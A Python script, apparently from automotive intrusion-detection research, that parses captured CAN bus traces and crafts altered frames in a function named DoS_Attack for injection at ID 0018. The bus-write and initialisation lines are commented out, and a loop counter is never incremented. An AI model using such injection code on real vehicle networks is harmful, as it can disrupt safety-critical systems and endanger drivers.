from PCANBasic import *
import random
import time
import pandas as pd
from os import walk

unused_bits = {'0165': [3, '00'], '051A': [0, '00'], '02B0': [3, '07'], '00A0': [6, '00'],
 '05E4': [0, '00'], '0153': [4, '00'], '02A0': [1, '00'], '0120': [0, '00'], '043F': [2, '60'],
 '0316': [7, '7F'], '04B1': [4, '00'], '0050': [0, '00'], '0164': [0, '00'], '0018': [1, '00'],
 '0044': [0, '00'], '0110': [0, 'E0'], '05F0': [0, '00'], '0329': [7, '10'], '0440': [3, '00'],
 '00A1': [2, '80'], '04F2': [4, '00'], '018F': [6, '00'], '0382': [0, '40'], '04F0': [0, '00'],
 '05A2': [0, '25'], '0034': [0, '00'], '0260': [3, '30'], '01F1': [0, '00'], '02C0': [0, '3D'],
 '0517': [1, '00'], '05A0': [0, '00'], '0080': [1, '17'], '04F1': [2, '00'], '0043': [0, '00'],
 '0350': [5, '00'], '059B': [0, '00'], '0081': [3, '00'], '0042': [1, 'FF'], '0510': [0, '00'],
 '0690': [0, '03'], '0587': [0, '00'], '0370': [0, 'FF']}

cols = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight']

mypath = "Filtered Datas"
files = []

for (dirpath, dirnames, filenames) in walk(mypath):
    files.extend(filenames)

#importing dataset
def Convert_to_df(path):
    if path[-3:] == "trc":
        data_df = Convert_from_trc(path)[17:]
    elif path[-3:] == "txt": 
        data_df = Convert_from_txt(path)[1:]
    else:
        print("Error, not suitable file")
        exit()
    return data_df

def Convert_from_trc(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split(" ")
        b.append(list(filter(('').__ne__, temp)))
    final = pd.DataFrame(b, columns = cols)
    return final

#importing dataset
def Convert_from_txt(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split("\t")
        b.append(list(filter(('').__ne__, temp)))
    final = pd.DataFrame(b, columns = cols)
    return final

def Data_Analyzer(dataframe, ID):
    spec = dataframe[dataframe["ID"] == ID]
    new_col = []
    for i in range(8):
        new_col.append(cols[i+5])
        
    spec['All_Datas'] = spec[new_col].agg(' '.join, axis=1) 
    return list(spec['All_Datas'])


def DoS_Attack(id, data):
    all_datas = ""
    Fuzzing_ID = int(id, 16)

    DoS_DATA = TPCANMsg()
    DoS_DATA.ID = Fuzzing_ID
    DoS_DATA.LEN = len(data)
    DoS_DATA.MSGTYPE = PCAN_MESSAGE_STANDARD
    
    all_datas += str(DoS_DATA.ID) + "\t" + str(DoS_DATA.LEN) + "\t"
    
    check_ind = unused_bits[id][0]
    check_val = unused_bits[id][1]
    for i in range(len(data)):
        if check_ind == i and check_val == data[i]:
            DoS_DATA.DATA[i] = int(data[i], 16) + 2
        else:
            DoS_DATA.DATA[i] = int(data[i], 16)
        all_datas += str(DoS_DATA.DATA[i]) + "\t"
        # all_datas += data[i]+ "\t"

    print(all_datas)
    # CAN.Write(CAN_BUS, DoS_DATA)
    # time.sleep(time_offset)

if __name__ == "__main__":
    # CAN = PCANBasic()                           #CAN 생성자 
    # CAN_BUS = PCAN_USBBUS6    

    # result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    # if result != PCAN_ERROR_OK:           
    #     print("oh No")
    #     CAN.GetErrorText(result)
    #     print(result)
    
    path = "Dataset\\Replay Attack Injected Datas 2023-05-17-1.txt"
    normal_df = Convert_to_df(path)
    injection_id = "0018"
    used_datas = Data_Analyzer(normal_df, injection_id)
    print("LEN of Data: {0}".format(len(used_datas)))
    i = 0
    time_set = 0
    # while ind <= 500:
    # for i in range(len(used_datas)):
    while True:
        # Scenario: [0.001, 0.005, 0.1, 0.5]
        time_offset = 0.5
        # time_offset = random.uniform(0.001, 0.5)
        print(time_offset)        
        DoS_Attack(injection_id, used_datas[i].split(" "))
        if i == len(used_datas) - 1:
            i = 0
        time.sleep(time_offset)
        